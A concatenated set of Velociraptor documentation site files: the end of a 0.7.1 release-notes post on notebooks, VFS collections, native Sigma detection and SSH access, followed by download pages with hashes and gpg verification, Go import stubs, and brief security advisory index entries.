the sidebar, then select `Notebook Templates` from the search
screen. I then edit the built in `Notebooks.Default` artifact.

![Adding a new notebook template](adding_new_notebook_template.png)

I can define multiple cells in the notebook. Cells can be of type
`vql`, `markdown` or `vql_suggestion`. I usually use the `markdown`
cells to write instructions for users of how to use my notebook, while
`vql` cells can run queries like schedule collections or preset hunts.

Next I select the `Global notebooks` in the sidebar and click the `New
Notebook` button. This brings up a wizard that allows me to create a
new global notebook. After filling in the name of the notebook and
electing which user to share it with, I can choose the template for
this notebook.

![Adding a new notebook template](selecting_notebook_template.png)

I can see my newly added notebook template and select it.

![Viewing the notebook from template](view_notebook_from_template.png)

#### Copying notebook cells

In this release, Velociraptor allows copying of a cell from any
notebook to the Global notebooks. This facilitates a workflow where
users may filter, post-process and identify interesting artifacts in
various hunt notebooks or specific collection notebooks, but then copy
the post processed cell into a central Global notebook for
collaboration.

For the next example, I collect the server artifact
`Server.Information.Clients` and post process the results in the
notebook to count the different clients by OS.

![Post processing the results of a collection](post_processing_collections.png)

Now that I am happy with this query, I want to copy the cell to my
`Admin Notebook` which I created earlier.

![Copying a cell to a global notebook](copying_cell.png)

I can then select which `Global noteboook` to copy the cell into.

![The copied cell still refers to the old collection](view_copied_cell.png)

Velociraptor will copy the cell to the target notebook and add VQL
statements to still refer to the original collection. This allows
users of the global notebook to further refine the query if needed.

This workflow allows better collaboration between users.

### VFS Downloads

Velociraptor's VFS view is an interactive view of the endpoint's
filesystem. Users can navigate the remote filesystem using a familiar
tree based navigation and interactively fetch various files from the
endpoint.

Before the 0.7.1 release, the user was able to download and preview
individual files in the GUI but it was difficult to retrieve multiple
files downloaded into the VFS.

In the 0.7.1 release, there is a new GUI button to initiate a
collection from the VFS itself. This allows the user to download all
or only some of the files they had previously interactively downloaded
into the VFS.

For example consider the following screenshot that shows a few files
downloaded into the VFS.

![Viewing the VFS](vfs.png)

I can initiate a collection from the VFS - This is a server artifact
(similar to the usual File Finder artifacts) that simply traverses the
VFS with a glob uploading all files into a single collection.

![Initiating a VFS collection](vfs_collection.png)

Using the glob I can choose to retrieve files with a particular
filename pattern (e.g. only executables) or all files.

![Inspecting the VFS collection](inspect_vfs_collection.png)

Finally, the GUI shows a link to the collected flow where I can inspect
the files or prepare a download zip just like any other collection.


## New VQL plugins and capabilities

This release introduces an exciting new capability: `Built-in Sigma Support`.

### Built-in Sigma Support

Sigma is fast emerging as a popular standard for writing and
distributing detections. Sigma was originally designed as a portable
notation for multiple backend SIEM products: Detections expressed in
Sigma rules can be converted (compiled) into a target SIEM query
language (for example into Elastic queries) to run on the target SIEM.

Velociraptor is not really a SIEM in the sense that we do not usually
forward all events to a central storage location where large queries
can run on it. Instead, Velociraptor's philosophy is to bring the
query to the endpoint itself.

In Velociraptor, Sigma rules can directly be used on the endpoint,
without the need to forward all the events off the system first! This
makes Sigma a powerful tool for initial triage:

* Apply a large number of Sigma rules on the local event log files.
* Those rules that trigger immediately surface potentially malicious
  activity for further scrutiny.

This can be done quickly and at scale to narrow down on potentially
interesting hosts during an IR. A great demonstration of this approach
can be seen in the Video [Live Incident Response with
Velociraptor](https://youtu.be/Q1IoGX--814?si=sRu1o7uAJqezjIwY&t=3858)
where Eric Capuano uses the `Hayabusa` tool deployed via Velociraptor to
quickly identify the attack techniques evident on the endpoint.

Previously, we could only apply Sigma rules in Velociraptor by bundling
the `Hayabusa` tool - which presents a curated set of Sigma rules but
runs locally. In this release Sigma matching is done natively in
Velociraptor and therefore the [Velociraptor
Sigma](https://sigma.velocidex.com) project simply curates the same
rules that `Hayabusa` curates but does not require the `Hayabusa`
binary itself.

You can read the full [Sigma In Velociraptor]({{% ref
"/blog/2023/2023-11-15-sigma_in_velociraptor/" %}}) blog post that
describes this feature in great detail, but here I will quickly show
how it can be used to great effect.

First I will import the set of curated Sigma rules from the
`Velociraptor Sigma` project by collecting the
`Server.Import.CuratedSigma` server artifact.

![Getting the Curated Sigma rules](getting_curated_rules.png)

This will import a new artifact to my system with up to date Sigma
rules, divided into different `Status`, `Rule Level` etc. For this
example I will select the `Stable` rules at a `Critical Level`.

![Collecting sigma rules from the endpoint](collecting_sigma_rules.png)

After launching the collection, the artifact will return all the
matching rules and their relevant events. This is a quick artifact
taking less than a minute on my test system. I immediately see
interesting hits.

![Detecting critical level rules](detecting_critical_rules.png)

### Using Sigma rules for live monitoring

Sigma rules can be used on more than just log files. The Velociraptor
Sigma project also provides monitoring rules that can be used on live
systems for real time monitoring.

The `Velociraptor Hayabusa Live Detection` option in the Curated
import artifact will import an event monitoring version of the same
curated Sigma rules. After adding the rule to the client's monitoring
rules with the GUI, I can receive interesting events for matching
rules:

![Live detection of Sigma rules](live_sigma_detection.png)


## Other improvements

### SSH/SCP accessor

Velociraptor normally runs on the end point and can directly collect
evidence from the endpoint. However, many devices on the network can
not install an endpoint agent - either because the operating system is
not supported (for example embedded versions of Linux) or due to
policy.

When we need to investigate such systems we often can only access them
by Secure Shell (SSH). In the 0.7.1 release, Velociraptor has an `ssh`
accessor which allows all plugins that normally use the filesystem to
transparently use SSH instead.

For example, consider the `glob()` plugin which searches for files.

![Globing for files over SSH](glob_over_ssh.png)

We can specify that the `glob()` uses the `ssh` accessor to access the
remote system. By setting the `SSH_CONFIG` VQL variable, the accessor
is able to use the locally stored private key to be able to
authenticate with the remote system to access remote files.

We can combine this new accessor with the `remapping` feature to
reconfigure the VQL engine to substitute the `auto` accessor with the
`ssh` accessor when any plugin attempts to access files. This allows
us to transparently use the same artifacts that would access files
locally, but this time will transparently access these files over SSH:

![Remapping the auto accessor with ssh ](remapping_ssh.png)

This example shows how to use the SSH accessor to investigate a debian
system and collect the `Linux.Debian.Packages` artifact from it over
SSH.


### Distributed notebook processing

While Velociraptor is very efficient and fast, and can support a large
number of endpoints connected to the server, many users told us that
on busy servers, running notebook queries can affect server
performance. This is because a notebook query can be quite intense
(e.g. Sorting or Grouping a large data set) and in the default
configuration the same server is collecting data from clients,
performing hunts, and also running the notebook queries.

This release allows notebook processors to be run in another
process. In Multi-Frontend configurations (also called Master/Minion
configurations), the Minion nodes will now offer to perform notebook
queries away from the master node. This allows this sudden workload to
be distributed to other nodes in the cluster and improve server and
GUI performance.

### ETW Multiplexing

Previous support for Event Tracing For Windows (ETW) was
rudimentary. Each query that called the `watch_etw()` plugin to
receive the event stream from a particular provider created a new ETW
session. Since the total number of ETW sessions on the system is
limited to 64, this used precious resources.

In 0.7.1 the ETW subsystem was overhauled with the ability to
multiplex many ETW watchers on top of the same session. The ETW
sessions are created and destroyed on demand. This allows us to more
efficiently track many more ETW providers with minimal impact on the
system.

Additionally the `etw_sessions()` plugin can show statistics for all
sessions currently running including the number of dropped events.

### Artifacts can be hidden in the GUI

Velociraptor comes with a large number of built in artifacts. This can
be confusing for new users and admins may want to hide artifacts in
the GUI.

You can now hide an artifact from the GUI using the
`artifact_set_metadata()` VQL function. For example the following
query will hide all artifacts which do not have `Linux` in their name.

```sql
SELECT *, artifact_set_metadata(hidden=TRUE, name=name)
FROM artifact_definitions()
WHERE NOT name =~ "Linux"
```

Only Linux related artifacts will now be visible in the GUI

![Hiding artifacts from the GUI](filtered_artifacts.png)

### Local encrypted storage for clients.

It is sometimes useful to write data locally on endpoints instead of
transferring the data to the server. For example, if the client is not
connected to the internet for long periods it is useful to write data
locally. Also useful is to write data in case we want to recover it
later during an investigation.

The downside of writing data locally on the endpoints is that this
data may be accessed if the endpoint is later compromised. If the data
contains sensitive information this can be used by an attacker. This
is also primarily the reason that Velociraptor does not write a log
file on the endpoint. Unfortunately, this makes it difficult to debug
issues.

The 0.7.1 release introduces a secure local log file format. This
allows the Velociraptor client to write to the local disk in a secure
way. Once written the data can only be decrypted by the server.

While any data can be written to the encrypted local file, the
`Generic.Client.LocalLogs` artifact allows Velociraptor client logs to
be written at runtime.

![Writing local logs](local_logs.png)

To read these locally stored logs I can fetch them using the
`Generic.Client.LocalLogsRetrieve` artifact to retrieve the encrypted
local file. The file is encrypted using the server's public key and
can only be decrypted on the server.

![Inspecting the uploaded encrypted local file](encrypted_local_file.png)

Once on the server, I can decrypt the file using the collection's
notebook which automatically decrypts the uploaded file.

![Decrypting encrypted local file](decrypting_encrypted_local_file.png)

## Conclusions

There are many more new features and bug fixes in the latest release.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/rss/_index.md
======
---
menutitle: "RSS"
title: "RSS Feeds"
draft: false
weight: 250
no_edit: true
disableToc: true
no_children: true
noDisqus: true
hidden: true
---


This site has a the following RSS feeds that you can follow.

<i class="fas fa-newspaper"></i>
Blog Posts

[{{< baseurl >}}blog/index.xml]({{< baseurl >}}blog/index.xml)

<i class="fas fa-book"></i>
Built-in artifacts

[{{< baseurl >}}artifact_references/index.xml]({{< baseurl >}}artifact_references/index.xml)

<i class="fas fa-code"></i>
Community Exchange Artifacts

[{{< baseurl >}}exchange/index.xml]({{< baseurl >}}exchange/index.xml)

<i class="fas fa-brain"></i>
Knowledge Base articles

[{{< baseurl >}}knowledge_base/index.xml]({{< baseurl >}}knowledge_base/index.xml)

<i class="fas fa-play"></i>
Playbooks

[{{< baseurl >}}training/playbooks/index.xml]({{< baseurl >}}training/playbooks/index.xml)

<i class="fas fa-exclamation-triangle"></i>
Security Advisories

[{{< baseurl >}}announcements/advisories/index.xml]({{< baseurl >}}announcements/advisories/index.xml)

---END OF FILE---

======
FILE: /content/downloads/_index.md
======
---
title: "Downloads"
date: 2021-06-23T08:29:57Z
draft: false
weight: 25
no_children: true
pre: <i class="fas fa-download"></i>
release: 0.74.2
base_release: 0.74
arches:
  - desc: Windows AMD64 (64-bit) Executable
    name: windows-amd64.exe
    hash: dd77e7d49230a1e1433d9423f6468fb2f4cb4d4806194b614eb83c431a0ca99e
    platform: windows

  - desc: Windows AMD64 (64-bit) MSI
    name: windows-amd64.msi
    hash: b894d37894041edb830eebd101b9f085c286eda5981562a7683f996f97d46d62
    platform: windows

  - desc: Windows 32-bit Executable
    name: windows-386.exe
    hash: 59ceeb27ec33ae4c7aa665f23353977f9c78358486e75bb83b7c52cc92b7306b
    platform: windows

  - desc: Windows 32-bit MSI
    name: windows-386.msi
    hash: aa7bd782d6faf17493e779a44c238a4e715c7063c6a9b07ecbdcdaec07b96f93
    platform: windows

  - desc: Linux Ubuntu 22.04 AMD64 and later. Recommended for servers.
    name: linux-amd64
    hash: 4d5b02e36abc57e8518287afcee56caf121b4f54e388e7a5553c5e87ac655ae0
    platform: linux

  - desc: Linux Ubuntu 22.04 ARM and later. Recommended for servers or containers.
    name: linux-arm64
    hash: a3f47f5c82f5d76296705feedc47eac66d758f7ffb288b31fe147305071bdd95
    platform: linux

  - desc: Linux Static Build (Older Releases, e.g. RHEL, Centos) Recommended for clients.
    name: linux-amd64-musl
    hash: bfff7ea596ca0a991aebcf648dc1e1be009bdc4888a0cef521426c7107814268
    platform: linux

  - desc: MacOS AMD64
    name: darwin-amd64
    hash: 0bbeb1d18271599f3062af1332964c950bfddda2fd5e8ed768ce51e7e8aa5ddf
    platform: apple

  - desc: MacOS ARM (M1, M2 chipsets)
    name: darwin-arm64
    hash: bbed0805c9195f0f23a24cb9189266ea8d8907d6b7d708df14b3ffbe80db2505
    platform: apple

  - desc: FreeBSD AMD64
    name: freebsd-amd64
    hash: 7a7a0109d300b385a6b3de06f60d38ddcc1dce80a2b0e0a8d36cc85b843d23e0
    platform: freebsd
    release: 0.74.1

  - desc: Windows AMD64 (64 bits) Executable For Windows 7 Only
    name: windows-amd64-legacy.exe
    hash: fdc94e1e928b832b7ec2c72cf5fde468a2a55cc1b32841ca44d83eae86765424
    platform: windows

  - desc: Windows 32 bits Executable For Windows 7 Only
    name: windows-386-legacy.exe
    hash: 67be97f7a82a4f9bf3f0ca33fcf774087468c49cd66cfc59ac1031f90ffb3e76
    platform: windows


---

Velociraptor is open source software and is free for anyone to use under the
[AGPL License](https://github.com/Velocidex/velociraptor?tab=License-1-ov-file#readme).

This page is for the current release. [The previous Release is 0.73.4]({{< ref "/downloads/previous_downloads" >}})

{{< release_download >}}

## Release notes

Full release notes are published in our [release blog post]({{< ref "/blog/2025/2025-02-23-release-notes-0.74/" >}})

{{% notice note "Support for Windows 7" %}}

Golang has officially [ended support for Windows
7](https://github.com/golang/go/issues/57003) with the Go 1.20
release. Current builds do not support this platform.

The Windows 7 binaries mentioned above are built with the deprecated
Go 1.20 release which is known to work on Windows 7.

However, note the following caveats:

* To build under this unsupported Go version we had to freeze
  dependencies. Therefore this build includes known buggy and
  unsupported dependencies.

* This build may be insecure! since it includes unsupported
  dependencies.

* We typically update to the latest version of Velociraptor but it may
  be that in future we disable some feature (VQL plugins) that can not
  be easily updated.


**Do not use this build in a general deployment!** Only use it for
deploying on deprecated, unsupported operating systems:

* Windows 7
* Windows 8, 8.1

{{% /notice %}}


## Verifying your download

The Velociraptor releases are signed using gpg with key ID
`0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1`.

You can verify the signature using `gpg`:

```sh
$ gpg --verify velociraptor-v0.73.3-linux-amd64.sig
gpg: assuming signed data in 'velociraptor-v0.73.3-linux-amd64'
gpg: Signature made Mon 04 Nov 2024 07:36:05 SAST
gpg:                using RSA key 0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1
gpg: Good signature from "Velociraptor Team (Velociraptor - Dig deeper!  https://docs.velociraptor.app/) <support@velocidex.com>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 0572 F28B 4EF1 9A04 3F4C  BBE0 B22A 7FB1 9CB6 CFA1

```

You can import the key from your favorite key server:

```sh
$ gpg --search-keys 0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1
gpg: data source: https://keys.openpgp.org:443
(1)     Velociraptor Team (Velociraptor - Dig deeper!  https
          3072 bit RSA key B22A7FB19CB6CFA1, created: 2021-10-29
Keys 1-1 of 1 for "0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1".  Enter number(s), N)ext, or Q)uit >
```
---END OF FILE---

======
FILE: /content/downloads/previous_downloads/_index.md
======
---
title: "Previous Release"
date: 2021-06-23T08:29:57Z
draft: false
weight: 25
hidden: true
pre: <i class="fas fa-download"></i>
release: 0.73.4
base_release: 0.73
arches:
  - desc: Windows AMD64 (64-bit) Executable
    name: windows-amd64.exe
    hash: bf10c1d111d1c39f66e2505d34ea10957ac7b71c472973982022e2528af9ca7e
    platform: windows

  - desc: Windows AMD64 (64-bit) MSI
    name: windows-amd64.msi
    hash: fd11139f6ad9296eb5039f49ac22ba78e50d6d0414cea14ce9e7023203f40dbd
    platform: windows

  - desc: Windows 32-bit Executable
    name: windows-386.exe
    hash: e5c4d10aee04f6d93876bd9dc91b8ce5bc34afec9c6422289364b033bad9d6a3
    platform: windows

  - desc: Windows 32-bit MSI
    name: windows-386.msi
    hash: f041fcefb2a8e55ddd03a7bde775b184c19a22fb7d9e29949f6e26d7246a3f96
    platform: windows

  - desc: Linux Ubuntu 22.04 AMD64 and later. Recommended for servers.
    name: linux-amd64
    hash: dca77fdd1ead956baca8b200e2effd66585bbca9da3bc3f7a23a09203f3ebedd
    platform: linux
    release: 0.73.5

  - desc: Linux Ubuntu 22.04 ARM and later. Recommended for servers or containers.
    name: linux-arm64
    hash: fb0f9aed0314630f69cb6de56e0232d93b899bd9cc3ccf9cbe704256a238b44d
    platform: linux
    release: 0.73.5

  - desc: Linux Static Build (Older Releases, e.g. RHEL, Centos) Recommended for clients.
    name: linux-amd64-musl
    hash: b8c951a08358ef6b586cdbff38d216ba34e16ad9f6ce5c5482cde84ac8f221ea
    platform: linux
    release: 0.73.5

  - desc: MacOS AMD64
    name: darwin-amd64
    hash: f22f1b3a905f658b61ec491aa7f104b5e20a75f192b42dba5ffe0f50d9f1353b
    platform: apple
    release: 0.73.3

  - desc: MacOS ARM (M1, M2 chipsets)
    name: darwin-arm64
    hash: 8d4e9d4fc00cbc8aa86dbd4b70101491e2a6c8a8d582896d6cf18bfff06ad56b
    platform: apple
    release: 0.73.3

  - desc: FreeBSD AMD64
    name: freebsd-amd64
    release: 0.72.4
    base_release: 0.72
    hash: 3ef039583ebaffce281df070b868455bc2dbc234f4b2ed3988cea8dd50116003
    platform: freebsd

  - desc: Windows AMD64 (64 bits) Executable For Windows 7 Only
    name: windows-amd64-legacy.exe
    release: 0.73.3
    base_release: 0.73
    hash: 7c4f155a16445f7564df1e01aa6ccc59db952c967d30c3a160c31be7932cd74f
    platform: windows

  - desc: Windows 32 bits Executable For Windows 7 Only
    name: windows-386-legacy.exe
    release: 0.73.3
    base_release: 0.73
    hash: 6342a3fcaa8938fd71c7956b098c96a68c64e68cbfb27e98d70ac3216c799dbe
    platform: windows


---

This is an old release - check out the [current release]({{< ref "/downloads" >}})

{{< release_download >}}

## Release notes

Full release notes are published in our [release blog post]({{< ref "/blog/2024/2024-09-10-release-notes-0.73/" >}})

{{% notice note "Support for Windows 7" %}}

Golang has officially [ended support for Windows
7](https://github.com/golang/go/issues/57003) with the Go 1.20
release. Current builds do not support this platform.

The Windows 7 binaries mentioned above are built with the deprecated
Go 1.20 release which is known to work on Windows 7.

However, note the following caveats:

* To build under this unsupported Go version we had to freeze
  dependencies. Therefore this build includes known buggy and
  unsupported dependencies.

* This build may be insecure! since it includes unsupported
  dependencies.

* We typically update to the latest version of Velociraptor but it may
  be that in future we disable some feature (VQL plugins) that can not
  be easily updated.


**Do not use this build in a general deployment!** Only use it for
deploying on deprecated, unsupported operating systems:

* Windows 7
* Windows 8, 8.1

{{% /notice %}}


## Verifying your download

The Velociraptor releases are signed using gpg with key ID `0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1`. You can verify the signature using `gpg` [by following the instructions]({{% ref "/docs/deployment/#verifying-your-download" %}})

---END OF FILE---

======
FILE: /content/search/_index.md
======
---
title: "Search"
date: 2021-06-12T06:14:26Z
draft: false
noDisqus: true
weight: 400
pre: "<i class='fas fa-search'></i>"
---

<div class="search_box">
    <script async src="https://cse.google.com/cse.js?cx=ba9e3fd5873e95a74"></script>
    <div class="gcse-search"></div>
</div>

---END OF FILE---

======
FILE: /content/golang/evtx.md
======
+++
title = "EVTX"
type = "code"
vanity = "https://github.com/Velocidex/evtx"
aliases = [
   "evtx/cmd"
]
+++
---END OF FILE---

======
FILE: /content/golang/go-ntfs.md
======
+++
title = "Go-NTFS"
type = "code"
vanity = "https://github.com/Velocidex/go-ntfs"
aliases = [
    "go-ntfs/bin",
    "go-ntfs/parser",
]
+++
---END OF FILE---

======
FILE: /content/golang/vtypes.md
======
+++
title = "Vtypes"
type = "code"
vanity = "https://github.com/Velocidex/vtypes"
aliases = [

]
+++
---END OF FILE---

======
FILE: /content/golang/oleparse.md
======
+++
title = "OleParser"
type = "code"
vanity = "https://github.com/Velocidex/oleparse"
aliases = [
    "oleparse/cmd",
    "oleparse/fixtures",
]
+++
---END OF FILE---

======
FILE: /content/golang/go-yara.md
======
+++
title = "Go YARA"
type = "code"
vanity = "https://github.com/Velocidex/go-yara"
aliases = []
+++

---END OF FILE---

======
FILE: /content/golang/vfilter.md
======
+++
title = "Vfilter"
type = "code"
vanity = "https://github.com/Velocidex/vfilter"
aliases = [

]
+++
---END OF FILE---

======
FILE: /content/golang/regparser.md
======
+++
title = "Regparser"
type = "code"
vanity = "https://github.com/Velocidex/regparser"
aliases = [
    "regparser/cmd",
    "regparser/appcompatcache",
]
+++
---END OF FILE---

======
FILE: /content/golang/timetracker.md
======
+++
title = "Timetracker"
type = "code"
vanity = "https://github.com/Velocidex/timetracker"
aliases = [
    "timetracker/cmd",
]
+++
---END OF FILE---

======
FILE: /content/golang/go-pe.md
======
+++
title = "Go-PE"
type = "code"
vanity = "https://github.com/Velocidex/go-pe"
aliases = [
    "go-pe/cmd",
]
+++
---END OF FILE---

======
FILE: /content/golang/go-prefetch.md
======
+++
title = "Go-Prefetch"
type = "code"
vanity = "https://github.com/Velocidex/go-prefetch"
aliases = [
    "go-ntfs/cmd",
]
+++
---END OF FILE---

======
FILE: /content/golang/binparsergen.md
======
+++
title = "Binparsergen"
type = "code"
vanity = "https://github.com/Velocidex/binparsergen"
aliases = [
    "binparsergen/cmd",
    "binparsergen/reader"
]
+++
---END OF FILE---

======
FILE: /content/golang/velociraptor.md
======
+++
title = "Velociraptor"
type = "code"
vanity = "https://github.com/Velocidex/velociraptor"
# find velociraptor/ -type d -printf "\"%p\",\n" |grep -v -E '(.git|definitions|testdata|gui/velociraptor/src)' | sort
aliases = [
"velociraptor/",
"velociraptor/acls",
"velociraptor/acls/proto",
"velociraptor/actions",
"velociraptor/actions/proto",
"velociraptor/actions/test_data",
"velociraptor/api",
"velociraptor/api/authenticators",
"velociraptor/api/mock",
"velociraptor/api/proto",
"velociraptor/artifacts",
"velociraptor/artifacts/assets",
"velociraptor/artifacts/proto",
"velociraptor/bin",
"velociraptor/config",
"velociraptor/config/proto",
"velociraptor/constants",
"velociraptor/crypto",
"velociraptor/crypto/client",
"velociraptor/crypto/proto",
"velociraptor/crypto/server",
"velociraptor/crypto/testing",
"velociraptor/crypto/utils",
"velociraptor/datastore",
"velociraptor/datastore/test_data",
"velociraptor/debian",
"velociraptor/docker",
"velociraptor/docs",
"velociraptor/docs/monitoring",
"velociraptor/docs/references",
"velociraptor/docs/saml",
"velociraptor/docs/wix",
"velociraptor/executor",
"velociraptor/file_store",
"velociraptor/file_store/api",
"velociraptor/file_store/csv",
"velociraptor/file_store/directory",
"velociraptor/file_store/memory",
"velociraptor/file_store/mysql",
"velociraptor/file_store/result_sets",
"velociraptor/file_store/test_utils",
"velociraptor/flows",
"velociraptor/flows/fixtures",
"velociraptor/flows/proto",
"velociraptor/glob",
"velociraptor/glob/fixtures",
"velociraptor/grpc_client",
"velociraptor/gui",
"velociraptor/gui/assets",
"velociraptor/gui/velociraptor",
"velociraptor/gui/velociraptor/assets",
"velociraptor/gui/velociraptor/build",
"velociraptor/gui/velociraptor/build/static",
"velociraptor/gui/velociraptor/public",
"velociraptor/http_comms",
"velociraptor/http_comms/test_data",
"velociraptor/json",
"velociraptor/logging",
"velociraptor/notifications",
"velociraptor/paths",
"velociraptor/paths/artifacts",
"velociraptor/proto",
"velociraptor/reporting",
"velociraptor/reporting/templates",
"velociraptor/responder",
"velociraptor/scripts",
"velociraptor/server",
"velociraptor/services",
"velociraptor/services/client_info",
"velociraptor/services/client_monitoring",
"velociraptor/services/ddclient",
"velociraptor/services/frontend",
"velociraptor/services/frontend/proto",
"velociraptor/services/hunt_dispatcher",
"velociraptor/services/hunt_manager",
"velociraptor/services/interrogation",
"velociraptor/services/inventory",
"velociraptor/services/inventory/fixtures",
"velociraptor/services/journal",
"velociraptor/services/labels",
"velociraptor/services/launcher",
"velociraptor/services/launcher/fixtures",
"velociraptor/services/notifications",
"velociraptor/services/repository",
"velociraptor/services/sanity",
"velociraptor/services/sanity/fixtures",
"velociraptor/services/server_artifacts",
"velociraptor/services/server_monitoring",
"velociraptor/services/server_monitoring/fixtures",
"velociraptor/services/vfs_service",
"velociraptor/startup",
"velociraptor/third_party",
"velociraptor/third_party/cache",
"velociraptor/third_party/zip",
"velociraptor/tools",
"velociraptor/uploads",
"velociraptor/uploads/fixtures",
"velociraptor/users",
"velociraptor/utils",
"velociraptor/vql",
"velociraptor/vql/common",
"velociraptor/vql/filesystem",
"velociraptor/vql/functions",
"velociraptor/vql/golang",
"velociraptor/vql/linux",
"velociraptor/vql/networking",
"velociraptor/vql/parsers",
"velociraptor/vql/parsers/csv",
"velociraptor/vql/parsers/ese",
"velociraptor/vql/parsers/event_logs",
"velociraptor/vql/parsers/fixtures",
"velociraptor/vql/parsers/recyclebin",
"velociraptor/vql/parsers/syslog",
"velociraptor/vql/parsers/usn",
"velociraptor/vql/protocols",
"velociraptor/vql/readers",
"velociraptor/vql/server",
"velociraptor/vql/server/clients",
"velociraptor/vql/server/downloads",
"velociraptor/vql/server/fixtures",
"velociraptor/vql/server/hunts",
"velociraptor/vql/server/notebooks",
"velociraptor/vql/sorter",
"velociraptor/vql/tools",
"velociraptor/vql/tools/fixtures",
"velociraptor/vql/windows",
"velociraptor/vql/windows/authenticode",
"velociraptor/vql/windows/dns",
"velociraptor/vql/windows/etw",
"velociraptor/vql/windows/filesystems",
"velociraptor/vql/windows/filesystems/readers",
"velociraptor/vql/windows/process",
"velociraptor/vql/windows/wmi",
"velociraptor/vql/windows/wmi/parse",
"velociraptor/vql/windows/wmi/parse/fixtures",
"velociraptor/vql_plugins",
"velociraptor/vtesting",
]
+++

---END OF FILE---

======
FILE: /content/golang/_index.md
======
---
title: Other Velocidex Projects
hidden: true
---
---END OF FILE---

======
FILE: /content/golang/go-ese.md
======
+++
title = "Go ESE Parser"
type = "code"
vanity = "https://github.com/Velocidex/go-ese"
aliases = [
    "go-ese/bin",
    "go-ese/parser",
]
+++

---END OF FILE---

======
FILE: /content/announcements/_index.md
======
---
menutitle: "Announcements"
title: "Announcements"
weight: 5
no_edit: true
pre: <i class="fas fa-bullhorn"></i>
---

{{% children  %}}

---END OF FILE---

======
FILE: /content/announcements/advisories/_index.md
======
---
menutitle: "Security Advisories"
title: "Security Advisories"
description: |
    CVEs and other security advisories.
weight: 10
no_edit: true
noTitle: true
pre: <i class="fas fa-exclamation-triangle"></i>
outputs:
- html
- RSS
---

The following CVEs have been noted.

Please upgrade to [the current release]({{< baseurl >}}/downloads).

{{% children "description"=true "style"="h3" %}}

Please consider subscribing to our [Security Advisories RSS feed]({{< baseurl >}}/rss) to receive
timely notifications.

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2023-0242/_index.md
======
---
menutitle: "CVE-2023-0242"
title: "CVE-2023-0242  Insufficient Permission Check In The VQL Copy() Function"
description: |
    Improper Privilege Management vulnerability in Rapid7 Velociraptor in the copy() function.
    This issue affects Velociraptor: before 0.6.7-5.
weight: 10
date: 2023-01-18T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2023-0242.html" >}}

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2025-0914/_index.md
======
---
menutitle: "CVE-2025-0914"
title: "CVE-2025-0914 Velociraptor Shell Plugin prevent_execve bypass"
description: |
    Velociraptor normally allows agents to run arbitrary commands via
    the `execve()` plugin. This option can be blocked by configuring the
    `prevent_execve` configuration option.
weight: 10
date: 2025-02-25T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2025-0914.html" >}}

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2023-0290/_index.md
======
---
menutitle: "CVE-2023-0290"
title: "CVE-2023-0290 Directory Traversal In Client Id Parameter"
description: |
    Velociraptor did not properly sanitize the client id parameter to the CreateCollection API allowing a directory traversal in where the collection task could be written.
    This issue affects Velociraptor: before 0.6.7-5.
weight: 10
date: 2023-01-17T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2023-0290.html" >}}

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2024-10526/_index.md
======
---
menutitle: "CVE-2024-10526"
title: "CVE-2024-10526 Local Privilege Escalation In Windows Velociraptor Service"
description: |
    The Velociraptor Windows MSI installer creates the installation directory with WRITE_DACL permission to the BUILTIN\\Users group. This allows local users who are not administrators to grant themselves the Full Control permission on Velociraptor's files. By modifying Velociraptor's files, local users can subvert the binary and cause the Velociraptor service to execute arbitrary code as the SYSTEM user, or to replace the Velociraptor binary completely.
weight: 10
date: 2024-11-03T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2024-10526.html" >}}

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2023-5950/_index.md
======
---
menutitle: "CVE-2023-5950"
title: "CVE-2023-5950  Rapid7 Velociraptor Reflected XSS"
description: |
    Rapid7 Velociraptor versions prior to 0.7.0-4 suffer from a
    reflected cross site scripting vulnerability. This vulnerability
    allows attackers to inject JS into the error path, potentially
    leading to unauthorized execution of scripts within a user's web
    browser. This issue affects Velociraptor: before 0.7.0-4.
    Patches are also available for version 0.6.9 (0.6.9-1)
weight: 10
date: 2023-11-06T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2023-5950.html" >}}

---END OF FILE---

======
FILE: /content/announcements/advisories/CVE-2023-2226/_index.md
======
---
menutitle: "CVE-2023-2226"
title: "CVE-2023-2226  Velociraptor crashes while parsing some malformed PE or OLE files"
description: |
    Due to insufficient validation in the PE and OLE parsers in
    Rapid7's Velociraptor versions earlier than 0.6.8 allows attacker
    to crash Velociraptor during parsing of maliciously malformed
    files. This issue affects Velociraptor: before 0.6.8.
weight: 10
date: 2023-04-21T00:00:00Z
no_edit: true
noTitle: false
no_children: true
---

{{< include-html "CVE-2023-2226.html" >}}

---END OF FILE---

======
FILE: /content/announcements/2021-artifact-contest/_index.md
======
---
menutitle: "2021 Contest"
title: "2021 Velociraptor Contributor Competition"
description: |
    Were you planning to try Velociraptor in the past? You can now win some awesome prizes by learning and applying Velociraptor to your own network.

weight: 10
hidden: true
no_edit: true
---

## The Contest is now closed!

Check out the [submissions]({{< ref "/blog/2021/2021-10-08-contributor-contest/_index.md" >}}) and watch the winning presentation at the [SANS Threat Hunting Summit](https://www.sans.org/cyber-security-training-events/threat-hunting-and-incident-response-summit-2021/#agenda)

## Goals

This competition encourages development of useful content and
extension to the Velociraptor platform. Content may be VQL (server or
client), plugin, integration, workflow or other capabilities.

